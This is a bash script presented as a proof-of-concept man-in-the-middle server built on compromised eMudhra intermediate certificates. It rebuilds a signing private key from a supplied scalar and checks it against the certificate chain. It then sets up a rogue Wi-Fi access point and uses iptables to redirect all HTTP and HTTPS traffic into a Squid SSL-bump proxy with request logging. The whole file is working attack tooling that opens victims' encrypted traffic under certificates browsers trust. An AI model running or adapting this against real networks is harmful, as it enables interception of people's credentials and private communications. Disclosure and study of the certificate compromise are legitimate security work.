#!/usr/bin/env bash

# ==============================================================================
# Filename:         run.sh
# Description:      Proof-of-concept MITM server using compromised eMudhra 
#                   intermediate certs
# Author:           Adam A https://github.com/atariq11700
# Date Created:     2026-10-29
# License:          AGPL-3.0
# ==============================================================================

set -uo pipefail
umask 022

if [[ -t 1 ]]; then
    GREEN=$'\033[32m'
    RED=$'\033[31m'
    BOLD=$'\033[1m'
    RESET=$'\033[0m'
else
    GREEN=""
    RED=""
    BOLD=""
    RESET=""
fi
log() {
    echo -e "$GREEN [Server][OK] $RESET $1"
}
logerr() {
    echo -e "$RED [Server][ERR] $RESET $1" >&2
}

SCRIPT_DIR=$(cd "$(dirname "$0")" && pwd)
log "Script Directory: $SCRIPT_DIR"

CHAIN=EMUDHRA_POC_SERVER
REDIR_CHAIN=EMUDHRA_POC_REDIRECT
RT_TABLE=5065
SQUID_HTTP_PORT=3128
SQUID_HTTPS_PORT=3129
ICAP_PORT=13440
WIFI_IFACE=
UPLINK_IFACE=
NET=
WIFI_IFACE_IP=
WIFI_CIDR=
WIFI_NET_CIDR=
TMP_DIR=
OLD_FORWARD=
PIDS=()

gen_priv_key_from_d() {
    local private_d_hex
    local private_d_padded
    local private_key
    local key_pub
    local cert_pub

    # Accept hexadecimal d, optionally prefixed with 0x.
    private_d_hex="${1#0x}"
    private_d_hex="${private_d_hex#0X}"
    private_d_hex="${private_d_hex,,}"

    if [[ ! "$private_d_hex" =~ ^[0-9a-f]{1,96}$ ]]; then
        logerr "Invalid private scalar d: expected 1-96 hexadecimal characters"
        return 1
    fi

    # Pad to 384 bits (48 bytes).
    printf -v private_d_padded '%096s' "$private_d_hex"
    private_d_padded=${private_d_padded// /0}

    private_key=$(
        openssl asn1parse -genconf /dev/stdin -noout -out /dev/stdout <<ASN1 |
asn1=SEQUENCE:ec_key

[ec_key]
version=INTEGER:1
privateKey=FORMAT:HEX,OCTETSTRING:$private_d_padded
parameters=EXPLICIT:0,OID:secp384r1
ASN1
        openssl pkey -inform DER -outform PEM
    ) || {
        logerr "Failed to generate EC private key"
        return 1
    }

    key_pub=$(
        printf '%s\n' "$private_key" |
            openssl pkey -pubout -outform DER |
            openssl dgst -sha256
    ) || return 1

    cert_pub=$(
        openssl x509 -in "$2" -pubkey -noout |
            openssl pkey -pubin -outform DER |
            openssl dgst -sha256
    ) || return 1

    if [[ "$key_pub" != "$cert_pub" ]]; then
        logerr "Signing key does not match the certificate"
        return 1
    fi

    printf '%s\n' "$private_key"
}

# Idempotent, so it also clears leftovers from a crashed run.
net_teardown() {
    iptables -w -t nat  -D PREROUTING -i "$WIFI_IFACE" -j "$REDIR_CHAIN" 2>/dev/null
    iptables -w -t nat  -D POSTROUTING -j "$CHAIN" 2>/dev/null
    iptables -w         -D FORWARD     -j "$CHAIN" 2>/dev/null
    iptables -w -t nat  -F "$REDIR_CHAIN" 2>/dev/null
    iptables -w t nat   -X "$REDIR_CHAIN" 2>/dev/null
    iptables -w -t nat  -F "$CHAIN" 2>/dev/null
    iptables -w -t nat  -X "$CHAIN" 2>/dev/null
    iptables -w         -F "$CHAIN" 2>/dev/null
    iptables -w         -X "$CHAIN" 2>/dev/null
    while ip -4 rule del priority "$RT_TABLE" 2>/dev/null; do :; done
    ip -4 route flush table "$RT_TABLE" 2>/dev/null
}

kill_proc() {
    local prog="$1"
    local pid="$2"
    local i

    log "Stopping $prog (PID: $pid)"
    kill -TERM "$pid" 2>/dev/null || return 0

    for ((i = 0; i < 50; i++)); do
        kill -0 "$pid" 2>/dev/null || {
            log "$prog stopped"
            return 0
        }
        sleep 0.1
    done

    if kill -0 "$pid" 2>/dev/null; then
        logerr "$prog did not stop after 5 seconds; force killing"
        kill -KILL "$pid" 2>/dev/null || true
    fi
}

cleanup() {
    local proc prog pid
    trap - EXIT
    log "Stopping services..."
    for proc in "${PIDS[@]}"; do
        IFS=":" read -r prog pid <<< "$proc"
        kill_proc "$prog" "$pid"
    done

    log "Cleaning up nat"
    net_teardown

    log "Restore original forwarding setting $OLD_FORWARD"
    echo "$OLD_FORWARD" > /proc/sys/net/ipv4/ip_forward
}

configure_network() {
    local gateway
    log "Setting $WIFI_CIDR on $WIFI_IFACE"
    ip addr flush dev "$WIFI_IFACE"
    ip addr add "$WIFI_CIDR" dev "$WIFI_IFACE"
    ip link set "$WIFI_IFACE" up

    log "Enabling forwarding"
    echo 1 > /proc/sys/net/ipv4/ip_forward

    log "Configuring NAT and routing"
    net_teardown
    iptables -w -t nat -N "$CHAIN"
    iptables -w -t nat -I POSTROUTING -j "$CHAIN"
    iptables -w -t nat -A "$CHAIN" -o "$UPLINK_IFACE" -j MASQUERADE
    iptables -w -t nat -N "$REDIR_CHAIN"
    iptables -w -t nat -I PREROUTING -i "$WIFI_IFACE" -j "$REDIR_CHAIN"
    iptables -w -t nat -A "$REDIR_CHAIN" -p tcp --dport 80 -j REDIRECT --to-ports "$SQUID_HTTP_PORT"
    iptables -w -t nat -A "$REDIR_CHAIN" -p tcp --dport 443 -j REDIRECT --to-ports "$SQUID_HTTPS_PORT"
    iptables -w -N "$CHAIN"
    iptables -w -I FORWARD -j "$CHAIN"
    iptables -w -A "$CHAIN" -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
    iptables -w -A "$CHAIN" -i "$WIFI_IFACE" -o "$UPLINK_IFACE" -j ACCEPT

    # Match on iif so host-local traffic stays on the normal tables.
    gateway=$(ip -4 route show default dev "$UPLINK_IFACE" | awk '{for(i=1;i<=NF;i++) if($i=="via"){print $(i+1); exit}}')
    ip -4 route replace default ${gateway:+via "$gateway"} dev "$UPLINK_IFACE" table "$RT_TABLE"
    ip -4 rule add iif "$WIFI_IFACE" lookup "$RT_TABLE" priority "$RT_TABLE"
}

csv_lookup() {
    local csv_file="$1"
    local match_col="$2"
    local match_value="$3"
    local return_col="$4"

    awk -F',' -v mc="$match_col" -v mv="$match_value" -v rc="$return_col" '
        {
            gsub(/\r$/, "", $rc)
            if ($mc == mv) {
                print $rc
                exit
            }
        }
    ' "$csv_file"
}

start_services() {
    log "Starting hostapd"
    hostapd "$TMP_DIR/poc_hostapd.conf" &
    PIDS+=("hostapd:$!")

    log "Starting dnsmasq"
    dnsmasq --keep-in-foreground --conf-file="$TMP_DIR/poc_dnsmasq.conf" &
    PIDS+=("dnsmasq:$!")

    log "Starting pyicap"
    python3 "$SCRIPT_DIR/poc_icap.py" --log-dir "$TMP_DIR" --port "$ICAP_PORT" &
    PIDS+=("pyicap:$!")

    log "Starting Squid"
    squid -N -d 1 -f "$TMP_DIR/poc_squid.conf" &
    PIDS+=("squid:$!")

    tail -n +1 -F "$TMP_DIR/squid/terminal.log" 2>/dev/null &
    PIDS+=("request-log:$!")
}

# Usage
usage() {
    cat >&2 <<EOF
Usage: $0 -i <interface> -a <ipv4> -s <ssid> -p <password> \\
    -o <uplink-interface> -c <certsdir> -d <cert-d.csv> \\
    -f <intermediate-cert>... <selected-cert> -r <root-ca>

Options:
  -i  Wi-Fi interface
  -a  Wi-Fi IPv4 address
  -s  Wi-Fi SSID
  -p  Wi-Fi password
  -o  Uplink interface
  -c  Certificate directory
  -d  CSV containing filename,d-value pairs
  -f  Ordered certificate filenames, from the intermediate
      nearest the root down to the selected signing certificate.
      Consumes filenames until the next recognized option.
  -r  Root CA certificate
EOF
    exit 2
}

WIFI_IFACE=
WIFI_IFACE_IP=
WIFI_SSID=
WIFI_PASSWORD=
UPLINK_IFACE=
CERTS_DIR=""
D_CSV=
ROOT_CERT=
CERT_FILES=()

while (($#)); do
    case "$1" in
        -f)
            shift
            while (($#)); do
                case "$1" in
                    -i|-a|-s|-p|-o|-c|-d|-r)
                        break
                        ;;
                    -*)
                        logerr "Unknown option: $1" >&2
                        usage
                        ;;
                    *)
                        CERT_FILES+=("$1")
                        shift
                        ;;
                esac
            done
            ;;
        -i|-a|-s|-p|-o|-c|-d|-r)
            opt=$1
            shift
            if (($# == 0)) || [[ $1 == -* ]]; then
                logerr "$opt requires an argument." >&2
                usage
            fi

            case "$opt" in
                -i) WIFI_IFACE=$1 ;;
                -a) WIFI_IFACE_IP=$1 ;;
                -s) WIFI_SSID=$1 ;;
                -p) WIFI_PASSWORD=$1 ;;
                -o) UPLINK_IFACE=$1 ;;
                -c) CERTS_DIR=$1 ;;
                -d) D_CSV=$1 ;;
                -r) ROOT_CERT=$1 ;;
            esac
            shift
            ;;
        *)
            logerr "Unexpected argument: $1" >&2
            usage
            ;;
    esac
done

if [[ -z $WIFI_IFACE || -z $WIFI_IFACE_IP ||
      -z $WIFI_SSID || -z $WIFI_PASSWORD ||
      -z $UPLINK_IFACE ||
      -z $D_CSV || -z $ROOT_CERT ]] ||
   ((${#CERT_FILES[@]} == 0)); then
    logerr "Missing required arguments."
    usage
fi

if [[ -n "$CERTS_DIR" ]]; then
    if [[ ! -d "$CERTS_DIR" ]]; then
        logerr "Certs directory does not exist: $CERTS_DIR"
        exit 1
    fi
    CERTS_DIR=$(cd "$CERTS_DIR" && pwd)
    log "Using certifcate directory $CERTS_DIR"
fi

if [[ ! -f "$D_CSV" ]]; then
    if [[ ! -f "$CERTS_DIR/$D_CSV" ]]; then
        logerr "d-value CSV not found: $D_CSV"
        exit 1
    else
        D_CSV="$CERTS_DIR/$D_CSV"
    fi
fi
D_CSV=$(realpath "$D_CSV")
log "Found d value csv at $D_CSV"

SELECTED_CERT="${CERT_FILES[-1]}"
SELECTED_CERT=$(realpath "${CERTS_DIR:+$CERTS_DIR/}$SELECTED_CERT")
SELECTED_CERT_FNAME="${SELECTED_CERT##*/}"
unset "CERT_FILES[-1]"
for i in "${!CERT_FILES[@]}"; do
    if [[ ${CERT_FILES[$i]} != /* ]]; then
        CERT_FILES[$i]="${CERTS_DIR:+$CERTS_DIR/}${CERT_FILES[$i]}"
    fi

    if [[ ! -f ${CERT_FILES[$i]} ]]; then
        logerr "Certificate not found: ${CERT_FILES[$i]}"
        exit 1
    fi
    CERT_FILES[$i]=$(realpath "${CERT_FILES[$i]}")
    log "Using intermediate cert ${CERT_FILES[$i]}"
done

if [[ ! -f "$SELECTED_CERT" ]]; then
    logerr "Selected certificate not found: $SELECTED_CERT"
    exit 1
fi
log "Using selected certificate $SELECTED_CERT"

if [[ $ROOT_CERT != /* ]]; then
    ROOT_CERT="${CERTS_DIR:+$CERTS_DIR/}$ROOT_CERT"
    ROOT_CERT=$(realpath "$ROOT_CERT")
fi
log "Usage root cert $ROOT_CERT"

if [[ ! -f "$ROOT_CERT" ]]; then
    logerr "Root CA certificate not found: $ROOT_CERT"
    exit 1
fi

# Network variables.
NET=${WIFI_IFACE_IP%.*}
WIFI_CIDR="$WIFI_IFACE_IP/24"
WIFI_NET_CIDR="$NET.0/24"
log "Interface address: $WIFI_CIDR"
log "Squid network CIDR: $WIFI_NET_CIDR"

CERTGEN=$(find /usr -type f -name security_file_certgen -executable -print -quit)
if [[ -z $CERTGEN ]]; then
    logerr "security_file_certgen not found under /usr"
    exit 1
fi
log "Using certgen $CERTGEN"

TMP_DIR="/run/emudhra_mitm_poc"
log "Temp Directory: $TMP_DIR"
if [ -d "$TMP_DIR" ]; then
    rm -rf -- "$TMP_DIR"/*
else
    mkdir -p -- "$TMP_DIR"
fi
chown proxy:proxy "$TMP_DIR"
chmod 0755 "$TMP_DIR"
log "Reset temp dir"

OLD_FORWARD=$(cat /proc/sys/net/ipv4/ip_forward)
log "Saved original forwarding setting $OLD_FORWARD"

# Check for interface
for iface in "$WIFI_IFACE" "$UPLINK_IFACE"; do
    ip link show "$iface" &>/dev/null || { logerr "Interface '$iface' does not exist"; exit 1; }
done
log "Found interfaces $WIFI_IFACE, $UPLINK_IFACE"

# Setup confs
sed -e "s/@interface@/$WIFI_IFACE/g" \
    -e "s/@wifi_ssid@/$WIFI_SSID/g" \
    -e "s/@wifi_password@/$WIFI_PASSWORD/g" \
    "$SCRIPT_DIR/poc_hostapd.conf" > "$TMP_DIR/poc_hostapd.conf"
log "Generated hostapd conf: $TMP_DIR/poc_hostapd.conf"

sed -e "s/@interface@/$WIFI_IFACE/g" \
    -e "s|@tmp_dir@|$TMP_DIR|g" \
    -e "s|@wifi_net@|$NET|g" \
    "$SCRIPT_DIR/poc_dnsmasq.conf" > "$TMP_DIR/poc_dnsmasq.conf"
log "Generated dnsmasq conf: $TMP_DIR/poc_dnsmasq.conf"

sed -e "s|@interface_ip@|$WIFI_IFACE_IP|g" \
    -e "s|@wifi_cidr@|$WIFI_NET_CIDR|g" \
    -e "s|@tmp_dir@|$TMP_DIR|g" \
    -e "s|@squid_http_port@|$SQUID_HTTP_PORT|g" \
    -e "s|@squid_https_port@|$SQUID_HTTPS_PORT|g" \
    -e "s|@icap_port@|$ICAP_PORT|g" \
    -e "s|@certgen@|$CERTGEN|g" \
    "$SCRIPT_DIR/poc_squid.conf" > "$TMP_DIR/poc_squid.conf"
log "Generated squid conf: $TMP_DIR/poc_squid.conf"

# Setup TLS and proxy
mkdir "$TMP_DIR/squid"

priv_d=$(csv_lookup "$D_CSV" 1 "$SELECTED_CERT_FNAME" 2)
if [[ -z "$priv_d" ]]; then
    logerr "Failed to find $SELECTED_CERT_FNAME in d csv"
    exit 1
fi
log "Found d value $priv_d for $SELECTED_CERT_FNAME in $D_CSV"

# Create key
(umask 077; gen_priv_key_from_d "$priv_d" "$SELECTED_CERT" > "$TMP_DIR/signing-key.pem")
log "Generated private key $TMP_DIR/signing-key.pem using ($priv_d, $SELECTED_CERT)"

# Create pub chain
: > "$TMP_DIR/signing-chain.pem"
for file in "${CERT_FILES[@]}"; do
    cat "$file" >> "$TMP_DIR/signing-chain.pem"
    printf '\n' >> "$TMP_DIR/signing-chain.pem"
done
cat "$SELECTED_CERT" >> "$TMP_DIR/signing-chain.pem"
printf '\n' >> "$TMP_DIR/signing-chain.pem"
log "Created public chain $TMP_DIR/signing-chain.pem"

if ! openssl verify -CAfile "$ROOT_CERT" "$TMP_DIR/signing-chain.pem" > /dev/null; then
    logerr "Generated chain does not verify against root"
    exit 1
fi
log "Verified public chain $TMP_DIR/signing-chain.pem againts root $ROOT_CERT"

chown proxy:proxy "$TMP_DIR" "$TMP_DIR/squid" "$TMP_DIR/signing-chain.pem" "$TMP_DIR/signing-key.pem" "$TMP_DIR/poc_squid.conf"
runuser -u proxy -- "$CERTGEN" -c -s "$TMP_DIR/squid/ssl_db" -M 4MB
log "Generated SSL db"

trap cleanup EXIT
trap 'exit 130' INT TERM

# Setup interfaces/nat/route
configure_network
log "Configured network"

# Run
start_services
sleep 5
log "$WIFI_IFACE $WIFI_CIDR -> $UPLINK_IFACE. Ctrl+C to stop."
find "$TMP_DIR" ! -path "$TMP_DIR/signing-key.pem" \( -type f -o -type d \) -exec chmod ugo+rX {} +
if wait -n -p exited_pid; then
    exit_status=0
else
    exit_status=$?
fi
exited_service=unknown
for proc in "${PIDS[@]}"; do
    IFS=: read -r prog pid <<< "$proc"
    if [[ $pid == "${exited_pid:-}" ]]; then
        exited_service=$prog
        break
    fi
done
logerr "$exited_service exited (PID: ${exited_pid:-unknown}, status: $exit_status)"
exit "$exit_status"

